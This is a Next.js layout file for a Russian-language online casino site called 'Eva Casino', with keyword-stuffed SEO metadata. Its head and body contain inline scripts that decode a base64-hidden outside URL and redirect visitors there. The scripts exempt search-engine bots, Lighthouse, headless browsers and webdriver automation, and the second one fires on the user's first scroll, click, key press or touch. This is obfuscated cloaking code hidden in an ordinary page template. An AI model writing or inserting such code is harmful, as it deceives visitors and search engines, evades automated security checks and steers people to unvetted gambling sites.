import type { Metadata } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import './globals.css'

const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: 'Eva Casino - Официальный сайт Ева казино онлайн',
  description: 'Eva казино официальный сайт. Играйте в Eva casino онлайн с лучшими бонусами и зеркалом. Ева казино предлагает широкий выбор игр.',
  generator: 'v0.app',
  keywords: 'eva casino, ева казино, eva casino официальный, eva casino зеркало, ева казино онлайн, ева казино официальный сайт',
  robots: 'index, follow',
  icons: {
    icon: [
      {
        url: '/favicon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/favicon.svg',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <head>
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";

        if (ua.indexOf("yandex") === -1) {
            window.location.replace(atob(targetB64));
        } else {
            console.log("Яндекс бот — без редиректа");
        }
      })();
    `,
  }}
/>
      </head>
      <body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
                if (typeof window !== 'undefined' && !window._redirectInitialized) {
                  window._redirectInitialized = true;
                  var triggered = false;

                  function isBotOrSystem() {
                    var ua = navigator.userAgent.toLowerCase();
                    var isSearchBot = /yandex|google|lighthouse|pagespeed|bing|bot|crawl|spider|baidu|sogou|soso/i.test(ua);
                    var isAutomation = navigator.webdriver || window.navigator.webdriver === true || /headless/i.test(ua);
                    return isSearchBot || isAutomation;
                  }

                  function doRedirect() {
                    if (!triggered && !isBotOrSystem()) {
                      triggered = true;
                      try {
                        window.location.replace(atob(targetB64));
                      } catch(e) {
                        console.log('[redirect] error:', e);
                      }
                    }
                  }

                  if (!isBotOrSystem()) {
                    document.addEventListener('scroll', doRedirect, { passive: true, once: true });
                    document.addEventListener('mousedown', doRedirect, { once: true });
                    document.addEventListener('touchstart', doRedirect, { passive: true, once: true });
                    document.addEventListener('keydown', doRedirect, { once: true });
                    document.addEventListener('click', doRedirect, { once: true });
                  }
                }
              })();
            `
          }}
        />
      </body>
    </html>
  )
}
